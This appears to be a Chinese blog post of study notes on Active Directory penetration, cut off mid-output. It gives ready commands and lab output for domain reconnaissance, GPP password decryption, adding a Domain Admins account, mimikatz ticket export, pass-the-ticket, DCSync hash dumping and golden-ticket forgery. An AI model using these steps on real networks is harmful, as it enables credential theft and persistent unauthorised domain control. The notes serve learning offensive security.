        <content type="html"><![CDATA[<h1 id="域渗透总结学习"><a href="#域渗透总结学习" class="headerlink" title="域渗透总结学习"></a>域渗透总结学习</h1><hr><p>总结/记录一下域渗透的渗透过程和一些坑点。</p><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><blockquote><p><a href="https://pentestlab.blog/tag/ntds-dit/">https://pentestlab.blog/tag/ntds-dit/</a><br><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse</a><br><a href="https://adsecurity.org/">https://adsecurity.org/</a></p></blockquote><blockquote><p><strong>在域中对机器进行访问（如dir/psexec等），不能使用IP，需要使用完整的机器名.域名。</strong><br><strong>注意域内相关的攻击，最好先把攻击机的DNS设置为域控，不然要手工把相关的域名、机器名的解析加入到hosts文件。</strong></p></blockquote><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">票据，经过KDC（一般就是域控）验证用户名密码正确后，生成的会话票据（可以理解为网站登录后的session）。</span><br><span class="line">黄金票据，使用krbtgt账号的hash，可以生成任意用户的票据。</span><br><span class="line">白银票据，使用主机账号的hash，可以生成用来控制该主机的服务票据（CIFS、WMI等）。</span><br><span class="line">非约束委派，服务可以使用其他用户的票据，如果其他用户登录过这个服务，则可以再这台服务的主机上导出登录用户的票据。</span><br><span class="line">约束委派，一个用户可以去申请另外一个服务（拥有权限的可委派服务）的票据（ST）。</span><br><span class="line">基于资源的约束委派，创建计算机账号，再利用</span><br><span class="line"></span><br><span class="line">crackmapexec新版编译成exe不能使用</span><br><span class="line">ntlmrelayx的windows exe版也不能使用</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest UseLogonCredential</span><br><span class="line">SYSVOL KB2962486</span><br></pre></td></tr></table></figure><h1 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h1><h3 id="net相关命令"><a href="#net相关命令" class="headerlink" title="net相关命令"></a>net相关命令</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> config workstation</span><br><span class="line"><span class="built_in">net</span> user /domain</span><br><span class="line"><span class="built_in">net</span> group /domain</span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain</span><br><span class="line"><span class="built_in">net</span> group &quot;domain computers&quot; /domain</span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain</span><br><span class="line"><span class="built_in">net</span> user test /domain</span><br><span class="line"><span class="built_in">net</span> user test Admin123 /add /domain</span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; test /add /domain</span><br><span class="line">nltest /trusted_domains</span><br></pre></td></tr></table></figure><h3 id="dsquery"><a href="#dsquery" class="headerlink" title="dsquery"></a>dsquery</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">导出所有信息</span><br><span class="line">dsquery.exe * -attr * -limit <span class="number">0</span></span><br><span class="line">dsquery.exe * -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> -u ddh -p Admin123 -attr * -limit <span class="number">0</span></span><br><span class="line"></span><br><span class="line">dsquery.exe computer -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> -u ddh -p Admin123 -limit <span class="number">0</span></span><br><span class="line">dsquery.exe user -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> -u ddh -p Admin123 -limit <span class="number">0</span></span><br><span class="line"></span><br><span class="line">非约束委派</span><br><span class="line">dsquery.exe * -filter &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; -limit <span class="number">0</span></span><br><span class="line">约束委派</span><br><span class="line">dsquery.exe * -filter &quot;(&amp;(msds-allowedtodelegateto=*))&quot; -limit <span class="number">0</span> -attr distinguishedName msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure><h3 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">导出所有信息</span><br><span class="line">ldapsearch -x -H ldap://<span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span>:<span class="number">389</span> -D &quot;CN=ddh,CN=Users,DC=tt,DC=com&quot; -w Admin123 -b &quot;DC=tt,DC=com&quot;</span><br><span class="line">非约束委派</span><br><span class="line">ldapsearch -x -H ldap://<span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span>:<span class="number">389</span> -D &quot;CN=ddh,CN=Users,DC=tt,DC=com&quot; -w Admin123 -b &quot;DC=tt,DC=com&quot; &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot;</span><br><span class="line">约束委派</span><br><span class="line">ldapsearch -x -H ldap://<span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span>:<span class="number">389</span> -D &quot;CN=ddh,CN=Users,DC=tt,DC=com&quot; -w Admin123 -b &quot;DC=tt,DC=com&quot; &quot;(&amp;(msds-allowedtodelegateto=*))&quot;</span><br></pre></td></tr></table></figure><h3 id="AdFind"><a href="#AdFind" class="headerlink" title="AdFind"></a>AdFind</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">导出所有信息</span><br><span class="line">AdFind.exe -alldc+</span><br><span class="line">AdFind.exe -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> -u tt\ddh -up Admin123 -alldc+</span><br><span class="line"></span><br><span class="line">非约束委派</span><br><span class="line">AdFind.exe -f &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; cn operatingSystem distinguishedName</span><br><span class="line">约束委派</span><br><span class="line">AdFind.exe -f &quot;(&amp;(msds-allowedtodelegateto=*))&quot; cn distinguishedName msDS-AllowedToDelegateTo</span><br><span class="line"></span><br><span class="line">查询用户能够登陆的机器</span><br><span class="line">adfind -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">221</span>.<span class="number">130</span> -sc u:test</span><br><span class="line">adfind -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">221</span>.<span class="number">130</span> -sc u:test | <span class="built_in">findstr</span> userWorkstations //非域权限执行需要指定账户密码</span><br><span class="line"></span><br><span class="line">查看域内所有用户详细信息：</span><br><span class="line">AdFind.exe -h DNS_SERVER_IP -sc u:*</span><br></pre></td></tr></table></figure><h3 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询域中注册的服务</span><br><span class="line">setspn -q */*</span><br></pre></td></tr></table></figure><h3 id="ldapadmin"><a href="#ldapadmin" class="headerlink" title="ldapadmin"></a>ldapadmin</h3><p><img src="/images/image-20200830124641265.png" alt="image-20200830124641265"></p><p><img src="/images/image-20200830133745062.png" alt="image-20200830133745062"></p><h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">findstr /S /I cpassword \\DC\sysvol\xx.com\Policies\*.xml</span><br><span class="line"></span><br><span class="line">kali自带解密工具</span><br><span class="line">gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw</span><br></pre></td></tr></table></figure><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><ul><li>wevtutil</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登陆日志</span><br><span class="line">wevtutil qe security /q:<span class="string">&quot;Event[System[(EventID=4624 or EventID=4768 or EventID=4776)]]&quot;</span></span><br></pre></td></tr></table></figure><ul><li>fulleventlogview.exe</li></ul><p><img src="/images/image-20210105111015246.png" alt="image-20210105111015246"></p><h1 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h1><h3 id="缓存票据"><a href="#缓存票据" class="headerlink" title="缓存票据"></a>缓存票据</h3><p>可在非域机器上使用，访问必须用ComputerName.domain.local的形式去访问。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">域机器上导出可用票据，拷贝到本地</span><br><span class="line">mimikatz privilege::debug &quot;sekurlsa::tickets /export&quot; <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">在攻击者机器上导入高权限票据</span><br><span class="line">mimikatz privilege::debug &quot;kerberos::ptt C:\Users\jack\Desktop\Administrator@krbtgt-TT.COM.kirbi&quot; <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">使用票据访问其他域机器，还可以使用mimikatz直接同步导出指定用户的hash</span><br><span class="line"><span class="built_in">dir</span> \\域机器名.域名\c$</span><br><span class="line">psexec \\域机器名.域名 <span class="built_in">cmd</span></span><br><span class="line">mimikatz &quot;lsadump::dcsync /domain:tt.com /user:administrator&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> <span class="title">privilege</span>::<span class="title">debug</span> &quot;<span class="title">kerberos</span>::<span class="title">ptt</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>\<span class="title">Administrator</span>@<span class="title">krbtgt</span>-<span class="title">TT.COM.kirbi</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">privilege</span>::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">ERROR</span> <span class="title">kuhl_m_privilege_simple</span> ; <span class="title">RtlAdjustPrivilege</span> (20) <span class="title">c0000061</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">kerberos</span>::<span class="title">ptt</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>\<span class="title">Administrator</span>@<span class="title">krbtgt</span>-<span class="title">TT.COM.kirbi</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">* <span class="title">File</span>: &#x27;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>\<span class="title">Administrator</span>@<span class="title">krbtgt</span>-<span class="title">TT.COM.kirbi</span>&#x27;: <span class="title">OK</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">exit</span></span></span><br><span class="line"><span class="function"><span class="title">Bye</span>!</span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">dir</span> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$</span></span><br><span class="line"><span class="function"> 驱动器 \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$ 中的卷没有标签。</span></span><br><span class="line"><span class="function"> 卷的序列号是 7<span class="title">E13</span>-549<span class="title">E</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$ 的目录</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">2009/07/14  11:20    &lt;<span class="title">DIR</span>&gt;          <span class="title">PerfLogs</span></span></span><br><span class="line"><span class="function">2020/08/28  21:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function">2020/08/28  21:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)</span></span><br><span class="line"><span class="function">2020/08/28  21:54    &lt;<span class="title">DIR</span>&gt;          <span class="title">Users</span></span></span><br><span class="line"><span class="function">2020/08/29  16:14    &lt;<span class="title">DIR</span>&gt;          <span class="title">Windows</span></span></span><br><span class="line"><span class="function">               0 个文件              0 字节</span></span><br><span class="line"><span class="function">               5 个目录 30,553,546,752 可用字节</span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> &quot;<span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">user:administrator</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">user:administrator</span></span></span><br><span class="line"><span class="function">[<span class="title">DC</span>] &#x27;<span class="title">tt.com</span>&#x27; <span class="title">will</span> <span class="title">be</span> <span class="title">the</span> <span class="title">domain</span></span></span><br><span class="line"><span class="function">[<span class="title">DC</span>] &#x27;<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>&#x27; <span class="title">will</span> <span class="title">be</span> <span class="title">the</span> <span class="title">DC</span> <span class="title">server</span></span></span><br><span class="line"><span class="function">[<span class="title">DC</span>] &#x27;<span class="title">administrator</span>&#x27; <span class="title">will</span> <span class="title">be</span> <span class="title">the</span> <span class="title">user</span> <span class="title">account</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Object</span> <span class="title">RDN</span>           : <span class="title">Administrator</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">** <span class="title">SAM</span> <span class="title">ACCOUNT</span> **</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SAM</span> <span class="title">Username</span>         : <span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">Account</span> <span class="title">Type</span>         : 30000000 ( <span class="title">USER_OBJECT</span> )</span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Account</span> <span class="title">Control</span> : 00000200 ( <span class="title">NORMAL_ACCOUNT</span> )</span></span><br><span class="line"><span class="function"><span class="title">Account</span> <span class="title">expiration</span>   : 1601/1/1 8:00:00</span></span><br><span class="line"><span class="function"><span class="title">Password</span> <span class="title">last</span> <span class="title">change</span> : 2020/8/28 21:26:05</span></span><br><span class="line"><span class="function"><span class="title">Object</span> <span class="title">Security</span> <span class="title">ID</span>   : <span class="title">S</span>-1-5-21-1881962959-1052950955-462027270-500</span></span><br><span class="line"><span class="function"><span class="title">Object</span> <span class="title">Relative</span> <span class="title">ID</span>   : 500</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Credentials</span>:</span></span><br><span class="line"><span class="function">  <span class="title">Hash</span> <span class="title">NTLM</span>: 30<span class="title">a96699356033b84283b8918a895d67</span></span></span><br></pre></td></tr></table></figure><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><ul><li><p><strong>注意</strong></p><p>生成任意用户的票据，作为持久化后门利用，不怕用户改密码</p><p>可以在非域机器上使用，攻击机使用Win7</p><p>访问资源时，必须使用计算机的域名进行访问，不能使用IP</p><p>通过代理访问内网，则把主机域名的解析写入本地hosts文件</p></li><li><p><strong>条件</strong></p><p>krbtgt的hash、域SID</p></li><li><p><strong>操作</strong></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">从域控上先抓到hash和找到域ID</span><br><span class="line">mimikatz privilege::debug &quot;lsadump::lsa /inject /user:krbtgt&quot; <span class="keyword">exit</span></span><br><span class="line">mimikatz privilege::debug sekurlsa::krbtgt <span class="keyword">exit</span></span><br><span class="line">域SID也可以通过任意域用户执行whoami /all查看，去掉最后一个[-]及后面的就是了</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">清除票据要注意，先klist看看有票据不</span><br><span class="line">klist purge</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不在域中的机器，需要在hosts文件中加入这个域的域控的解析，如：<span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> tt.com</span><br><span class="line">hash也可以使用rc4/aes256，推荐使用aes256，rc4也是ntlm hash</span><br><span class="line">对于<span class="number">8</span>.<span class="number">1</span>/<span class="number">2012</span>r2，安装补丁kb2871997的Win <span class="number">7</span>/<span class="number">2008</span>r2/<span class="number">8</span>/<span class="number">2012</span>，可以使用AES keys代替NT hash</span><br><span class="line">mimikatz &quot;kerberos::golden /domain:域名 /user:任意域用户 /sid:域SID /krbtgt:NTLM_HASH /ptt&quot; <span class="keyword">exit</span></span><br><span class="line">mimikatz &quot;kerberos::golden /domain:域名 /user:任意域用户 /sid:域SID /rc4:NTLM_HASH /ptt&quot; <span class="keyword">exit</span></span><br><span class="line">mimikatz &quot;kerberos::golden /domain:域名 /user:任意域用户 /sid:域SID /aes256:NTLM_HASH /ptt&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用票据访问其他域机器，还可以使用mimikatz直接同步导出指定用户的hash</span><br><span class="line"><span class="built_in">dir</span> \\域机器名.域名\c$</span><br><span class="line">psexec \\域机器名.域名 <span class="built_in">cmd</span></span><br><span class="line">mimikatz &quot;lsadump::dcsync /domain:tt.com /user:administrator&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure></li><li><p>实践</p></li></ul><p>域控上：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">administrator</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> <span class="title">privilege</span>::<span class="title">debug</span> &quot;<span class="title">lsadump</span>::<span class="title">lsa</span> /<span class="title">inject</span> /<span class="title">user:krbtgt</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">(<span class="title">commandline</span>) # <span class="title">privilege</span>::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> \&#x27;20\&#x27; <span class="title">OK</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">(<span class="title">commandline</span>) # <span class="title">lsadump</span>::<span class="title">lsa</span> /<span class="title">inject</span> /<span class="title">user:krbtgt</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span> : <span class="title">TT</span> / <span class="title">S</span>-1-5-21-1881962959-1052950955-462027270</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RID</span>  : 000001<span class="title">f6</span> (502)</span></span><br><span class="line"><span class="function"><span class="title">User</span> : <span class="title">krbtgt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> * <span class="title">Primary</span></span></span><br><span class="line"><span class="function">    <span class="title">NTLM</span> : <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br><span class="line"><span class="function">    <span class="title">LM</span>   :</span></span><br><span class="line"><span class="function">  <span class="title">Hash</span> <span class="title">NTLM</span>: <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br><span class="line"><span class="function">    <span class="title">ntlm</span>- 0: <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br><span class="line"><span class="function">    <span class="title">lm</span>  - 0: 434028<span class="title">f38350b6c20235e2f900a1026d</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> * <span class="title">Kerberos</span>-<span class="title">Newer</span>-<span class="title">Keys</span></span></span><br><span class="line"><span class="function">    <span class="title">Default</span> <span class="title">Salt</span> : <span class="title">TT.COMkrbtgt</span></span></span><br><span class="line"><span class="function">    <span class="title">Default</span> <span class="title">Iterations</span> : 4096</span></span><br><span class="line"><span class="function">    <span class="title">Credentials</span></span></span><br><span class="line"><span class="function">      <span class="title">aes256_hmac</span>       (4096) : 464<span class="title">db31a5f9e55bd7b306d672eae7d39e79820079dd5244873756978b24b5e81</span></span></span><br><span class="line"><span class="function">      <span class="title">aes128_hmac</span>       (4096) : 236<span class="title">e2daf395726846e9b373dc97d6707</span></span></span><br><span class="line"><span class="function">      <span class="title">des_cbc_md5</span>       (4096) : 102<span class="title">ae391730140f2</span></span></span><br><span class="line"><span class="function">      <span class="title">rc4_plain</span>         (4096) : <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">administrator</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> <span class="title">privilege</span>::<span class="title">debug</span> <span class="title">sekurlsa</span>::<span class="title">krbtgt</span> <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">(<span class="title">commandline</span>) # <span class="title">privilege</span>::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> \&#x27;20\&#x27; <span class="title">OK</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">(<span class="title">commandline</span>) # <span class="title">sekurlsa</span>::<span class="title">krbtgt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Current</span> <span class="title">krbtgt</span>: 7 <span class="title">credentials</span></span></span><br><span class="line"><span class="function">         * <span class="title">rc4_hmac_nt</span>       : <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br><span class="line"><span class="function">         * <span class="title">rc4_hmac_old</span>      : <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br><span class="line"><span class="function">         * <span class="title">rc4_md4</span>           : <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br><span class="line"><span class="function">         * <span class="title">aes256_hmac</span>       : 464<span class="title">db31a5f9e55bd7b306d672eae7d39e79820079dd5244873756978b24b5e81</span></span></span><br><span class="line"><span class="function">         * <span class="title">aes128_hmac</span>       : 236<span class="title">e2daf395726846e9b373dc97d6707</span></span></span><br><span class="line"><span class="function">         * <span class="title">des_cbc_md5</span>       : 102<span class="title">ae391730140f2</span></span></span><br><span class="line"><span class="function">         * <span class="title">rc4_plain</span>         : <span class="title">df82614c9b975b345a1acf4c4a7571e3</span></span></span><br></pre></td></tr></table></figure><p>攻击机上：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> &quot;<span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">user:administrator</span> /<span class="title">sid:S</span>-1-5-21-1881962959-1052950955-462027270  /<span class="title">aes256</span>:464<span class="title">db31a5f9e55bd7b306d672eae7d39e79820079dd5244873756978b24b5e81</span> /<span class="title">ptt</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">user:administrator</span> /<span class="title">sid:S</span>-1-5-21-1881962959-1052950955-462027270  /<span class="title">aes256</span>:464<span class="title">db31a5f9e55bd7b306d672eae7d39e79820079dd5244873756978b24b5e81</span> /<span class="title">ptt</span></span></span><br><span class="line"><span class="function"><span class="title">User</span>      : <span class="title">administrator</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span>    : <span class="title">tt.com</span> (<span class="title">TT</span>)</span></span><br><span class="line"><span class="function"><span class="title">SID</span>       : <span class="title">S</span>-1-5-21-1881962959-1052950955-462027270</span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Id</span>   : 500</span></span><br><span class="line"><span class="function"><span class="title">Groups</span> <span class="title">Id</span> : *513 512 520 518 519</span></span><br><span class="line"><span class="function"><span class="title">ServiceKey</span>: 464<span class="title">db31a5f9e55bd7b306d672eae7d39e79820079dd5244873756978b24b5e81</span> - <span class="title">aes256_hmac</span></span></span><br><span class="line"><span class="function"><span class="title">Lifetime</span>  : 2020/8/29 16:08:30 ; 2030/8/27 16:08:30 ; 2030/8/27 16:08:30</span></span><br><span class="line"><span class="function">-&gt; 